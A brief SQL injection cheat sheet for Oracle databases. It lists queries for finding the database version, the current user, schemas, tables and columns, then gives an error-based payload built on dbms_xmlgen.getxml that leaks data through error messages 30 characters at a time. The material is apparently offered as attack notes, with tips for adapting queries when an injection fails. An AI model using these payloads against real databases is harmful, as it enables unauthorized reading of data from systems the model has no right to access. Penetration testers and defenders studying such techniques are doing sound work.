<b>Can try to remove semicolon if the query fails</b>

Version check: `select * from v$version;`

Current DB user check: `select user from dual;`

Curren <b>schemas</b> (any of the following):\
`SELECT global_name FROM global_name;`\
`SELECT name FROM v$database;`\
`SELECT instance_name FROM v$instance;`\
`SELECT SYS.DATABASE_NAME FROM DUAL;`

Get list of <b>schemas</b>:\
`select owner from all_tables group by owner;`\
`SELECT DISTINCT owner FROM all_tables;`

Get list of <b>tables</b> for a specific schema (eg SYS): `select table_name from all_tables where owner = 'SYS' order by table_name;`

Get the columns for specific table (eg MENU): `select column_name, data_type from all_tab_columns where table_name = 'MENU';`

Finally selecting the item: `select * from schemaname.tablename`

<b>Error based</b>: (Oracle limits column name to 30 characters so need to output 30 at a time)\
`to_char(dbms_xmlgen.getxml('select "'||(select substr(banner,0,30) from v$version where rownum=1)||'" from sys.dual')) `
